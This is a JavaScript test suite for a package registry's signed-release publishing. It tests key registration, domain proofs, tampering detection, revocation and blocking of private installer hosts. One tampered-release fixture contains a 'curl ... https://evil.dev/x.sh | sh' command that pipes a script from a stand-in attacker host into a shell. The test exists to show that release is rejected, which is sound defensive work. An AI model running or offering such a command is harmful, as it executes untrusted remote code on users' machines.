import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { startServer } from '../src/server.mjs';
import { openStore } from '../src/store.mjs';
import { privateAddress, releaseBytes } from '../src/publishing.mjs';
import { sshKeypair } from './sshsig.test.mjs';
import { mergeSigned } from '../scripts/catalog-signed.mjs';
import { parsePublicKey } from '../src/sshsig.mjs';

test('catalog-signed: the registry re-verifies signatures before merging, and drops withdrawn ones', () => {
  const key = sshKeypair(dir);
  const statement = statementFor({
    package: 'pairux.com/pairux',
    install: 'curl -fsSL https://pairux.com/install.sh | sh',
    installer: { url: 'https://pairux.com/install.sh', sha256: sha(INSTALLER) },
  });
  const signed = {
    statement,
    signature: key.sign(releaseBytes(statement), 'w3bs-release@w3bs.org'),
    public_key: key.publicKey,
    fingerprint: parsePublicKey(key.publicKey).fingerprint,
  };
  const curated = [
    {
      id: 'pairux.com/pairux',
      name: 'pairux',
      install: 'curl -fsSL https://old.example/install.sh | sh',
      latest_version: null,
      evidence: 'checked',
      publisher: 'profullstack',
    },
  ];
  const good = { id: 'pairux.com/pairux', install: statement.install, signed };
  const forged = {
    id: 'x.dev/x',
    install: statement.install,
    signed: { ...signed, statement: { ...statement, package: 'x.dev/x' } },
  };
  const { catalog, log } = mergeSigned(curated, [good, forged]);
  assert.equal(catalog.length, 1);
  assert.equal(catalog[0].latest_version, '1.0.0');
  assert.equal(catalog[0].evidence, 'checked');
  assert.equal(catalog[0].signed.fingerprint, signed.fingerprint);
  assert.ok(log.some((line) => line.startsWith('skip   x.dev/x')));
  // The key is revoked, so the server serves nothing: the curated entry stays, unsigned.
  const after = mergeSigned(catalog, []);
  assert.equal(after.catalog[0].signed, undefined);
  assert.equal(after.catalog[0].evidence, 'checked');
});

const ORIGIN = 'http://localhost:3000';
const dir = mkdtempSync(join(tmpdir(), 'publishing-'));
test.after(() => rmSync(dir, { recursive: true, force: true }));

const INSTALLER = '#!/bin/sh\necho installing tool\n';
const sha = (s) => createHash('sha256').update(s).digest('hex');

// The network the server sees: a public resolver, one web host per domain, TXT records.
function fakeNet() {
  const files = new Map();
  const txt = new Map();
  return {
    files,
    txt,
    options: {
      lookup: async (host) =>
        host === 'internal.example' ? [{ address: '10.0.0.5' }] : [{ address: '93.184.216.34' }],
      resolveTxt: async (name) => {
        if (!txt.has(name)) throw Object.assign(new Error('ENOTFOUND'), { code: 'ENOTFOUND' });
        return [[txt.get(name)]];
      },
      fetchImpl: async (url) => {
        const body = files.get(url);
        return body === undefined
          ? new Response('missing', { status: 404 })
          : new Response(body, { status: 200 });
      },
    },
  };
}

async function boot() {
  const net = fakeNet();
  const store = await openStore({ path: ':memory:', publishingOptions: net.options });
  const instance = await startServer({
    store,
    port: 0,
    publicOrigin: ORIGIN,
    mailer: { send: async () => ({ sent: true }) },
  });
  const base = `http://localhost:${instance.server.address().port}`;
  const accounts = store.accounts(ORIGIN);
  const user = async (username) => {
    const signup = await accounts.startSignup({ username, email: `${username}@example.com` });
    const { user: created } = await accounts.consumeLink(signup.link);
    return `w3bs_session=${await accounts.createSession(created.id)}`;
  };
  const http = async (path, { body, cookie, method } = {}) => {
    const res = await fetch(`${base}${path}`, {
      method: method ?? (body !== undefined ? 'POST' : 'GET'),
      headers: {
        ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}),
        ...(cookie ? { Cookie: cookie } : {}),
      },
      body: body !== undefined ? JSON.stringify(body) : undefined,
    });
    const type = res.headers.get('content-type') || '';
    return {
      status: res.status,
      body: type.includes('json') ? await res.json() : await res.text(),
    };
  };
  return { http, user, net, close: () => instance.close() };
}

async function registerKey(t, cookie, username, key, namespace) {
  const challenge = (await t.http('/api/publish/keys/challenge', { cookie })).body;
  assert.equal(challenge.message, `w3bs-key:${username}:${challenge.challenge}`);
  return t.http('/api/publish/keys', {
    cookie,
    body: {
      public_key: key.publicKey,
      namespace,
      challenge: challenge.challenge,
      signature: key.sign(Buffer.from(challenge.message), 'w3bs-key@w3bs.org'),
    },
  });
}

const statementFor = (overrides = {}) => ({
  type: 'w3bs-release/1',
  package: 'tool.dev/tool',
  version: '1.0.0',
  name: 'tool',
  description: 'A tool that does one thing well.',
  license: 'MIT',
  commands: ['tool'],
  install: 'curl -fsSL https://tool.dev/install.sh | sh',
  installer: { url: 'https://tool.dev/install.sh', sha256: sha(INSTALLER) },
  created_at: '2026-10-19T20:00:00Z',
  ...overrides,
});

test('publish: key + domain proof + signed release lands on /packages; every refusal holds', async () => {
  const t = await boot();
  try {
    const alice = await t.user('alice');
    const key = sshKeypair(dir);
    t.net.files.set('https://tool.dev/install.sh', INSTALLER);

    // Signed out: refused.
    assert.equal((await t.http('/api/publish/keys/challenge')).status, 401);

    // A challenge signed with the git namespace is not a key registration.
    const challenge = (await t.http('/api/publish/keys/challenge', { cookie: alice })).body;
    const wrongNs = await t.http('/api/publish/keys', {
      cookie: alice,
      body: {
        public_key: key.publicKey,
        namespace: 'tool.dev',
        challenge: challenge.challenge,
        signature: key.sign(Buffer.from(challenge.message), 'git'),
      },
    });
    assert.equal(wrongNs.status, 400);

    // Registered, but the domain does not list the key yet.
    const added = await registerKey(t, alice, 'alice', key, 'tool.dev');
    assert.equal(added.status, 200, JSON.stringify(added.body));
    assert.equal(added.body.domain_verified, false);
    const { fingerprint, proof } = added.body;
    assert.equal(proof.line, `w3bs-publisher=${fingerprint}`);

    const statement = statementFor();
    const signature = key.sign(releaseBytes(statement), 'w3bs-release@w3bs.org');
    const early = await t.http('/api/publish/releases', {
      cookie: alice,
      body: { statement, signature },
    });
    assert.equal(early.status, 403);
    assert.equal(early.body.error.code, 'DOMAIN_UNVERIFIED');

    // The well-known file lists it: verified, alice owns tool.dev.
    t.net.files.set('https://tool.dev/.well-known/w3bs-publisher.txt', `${proof.line}\n`);
    const verified = await t.http('/api/publish/keys/verify', {
      cookie: alice,
      body: { fingerprint },
    });
    assert.equal(verified.body.domain_verified, true);

    // A release signed with the git namespace, or tampered after signing, is refused.
    const gitSig = key.sign(releaseBytes(statement), 'git');
    assert.equal(
      (
        await t.http('/api/publish/releases', {
          cookie: alice,
          body: { statement, signature: gitSig },
        })
      ).status,
      400,
    );
    const tampered = {
      ...statement,
      install: 'curl -fsSL https://evil.dev/x.sh | sh',
      installer: { url: 'https://evil.dev/x.sh', sha256: sha(INSTALLER) },
    };
    assert.equal(
      (
        await t.http('/api/publish/releases', {
          cookie: alice,
          body: { statement: tampered, signature },
        })
      ).status,
      400,
    );

    // The real one is accepted and listed as signed.
    const ok = await t.http('/api/publish/releases', {
      cookie: alice,
      body: { statement, signature },
    });
    assert.equal(ok.status, 201, JSON.stringify(ok.body));
    assert.equal(ok.body.fingerprint, fingerprint);
    const pkg = (await t.http('/api/packages/tool.dev/tool')).body;
    assert.equal(pkg.latest_version, '1.0.0');
    assert.equal(pkg.signed.fingerprint, fingerprint);
    const catalog = (await t.http('/api/publish/catalog.json')).body;
    assert.deepEqual(
      catalog.map((e) => e.id),
      ['tool.dev/tool'],
    );
    const page = (await t.http('/packages/tool.dev/tool')).body;
    assert.match(page, /Publisher signature/);
    assert.match(page, new RegExp(fingerprint.replace(/[+/]/g, (c) => `\\${c}`)));

    // Immutable versions.
    const again = await t.http('/api/publish/releases', {
      cookie: alice,
      body: { statement, signature },
    });
    assert.equal(again.body.error.code, 'VERSION_EXISTS');

    // The installer must match the signed sha256.
    const v2 = statementFor({
      version: '1.1.0',
      installer: { url: 'https://tool.dev/install.sh', sha256: sha('other') },
    });
    const mismatch = await t.http('/api/publish/releases', {
      cookie: alice,
      body: { statement: v2, signature: key.sign(releaseBytes(v2), 'w3bs-release@w3bs.org') },
    });
    assert.equal(mismatch.body.error.code, 'INSTALLER_MISMATCH');

    // Another account cannot take tool.dev, nor sign for it.
    const bob = await t.user('bob');
    const bobKey = sshKeypair(dir);
    const taken = await registerKey(t, bob, 'bob', bobKey, 'tool.dev');
    assert.equal(taken.body.error.code, 'NAMESPACE_TAKEN');
    // Replaying alice's valid signature from bob's account does not make bob a publisher.
    const bobSig = await t.http('/api/publish/releases', {
      cookie: bob,
      body: { statement, signature },
    });
    assert.equal(bobSig.body.error.code, 'UNKNOWN_KEY');

    // Revoking the key delists its releases and stops new ones.
    const revoked = await t.http(`/api/publish/keys/${encodeURIComponent(fingerprint)}`, {
      cookie: alice,
      method: 'DELETE',
    });
    assert.ok(revoked.body.revoked_at);
    assert.deepEqual((await t.http('/api/publish/catalog.json')).body, []);
    assert.equal(
      (await t.http('/api/publish/releases/tool.dev/tool')).body.releases[0].revoked,
      true,
    );
    const v3 = statementFor({ version: '1.2.0' });
    const afterRevoke = await t.http('/api/publish/releases', {
      cookie: alice,
      body: { statement: v3, signature: key.sign(releaseBytes(v3), 'w3bs-release@w3bs.org') },
    });
    assert.equal(afterRevoke.body.error.code, 'KEY_REVOKED');
  } finally {
    await t.close();
  }
});

test('publish: a DNS TXT record also proves the domain; private installer hosts are refused', async () => {
  const t = await boot();
  try {
    const carol = await t.user('carol');
    const key = sshKeypair(dir, 'ecdsa');
    const added = await registerKey(t, carol, 'carol', key, 'internal.example');
    t.net.txt.set('_w3bs.internal.example', added.body.proof.line);
    assert.equal(
      (
        await t.http('/api/publish/keys/verify', {
          cookie: carol,
          body: { fingerprint: added.body.fingerprint },
        })
      ).body.domain_verified,
      true,
    );
    const statement = statementFor({
      package: 'internal.example/tool',
      install: 'curl -fsSL https://internal.example/install.sh | sh',
      installer: { url: 'https://internal.example/install.sh', sha256: sha(INSTALLER) },
    });
    t.net.files.set('https://internal.example/install.sh', INSTALLER);
    const res = await t.http('/api/publish/releases', {
      cookie: carol,
      body: { statement, signature: key.sign(releaseBytes(statement), 'w3bs-release@w3bs.org') },
    });
    assert.equal(res.body.error.code, 'FETCH_FAILED');
    assert.match(res.body.error.message, /public address/);
  } finally {
    await t.close();
  }
});

test('privateAddress covers loopback, RFC 1918, link-local, CGNAT and IPv6 local ranges', () => {
  for (const a of [
    '127.0.0.1',
    '10.1.2.3',
    '172.16.0.1',
    '192.168.1.1',
    '169.254.1.1',
    '100.64.0.1',
    '::1',
    'fd00::1',
    'fe80::1',
    '::ffff:127.0.0.1',
  ])
    assert.equal(privateAddress(a), true, a);
  for (const a of ['93.184.216.34', '1.1.1.1', '2606:4700::1111'])
    assert.equal(privateAddress(a), false, a);
});
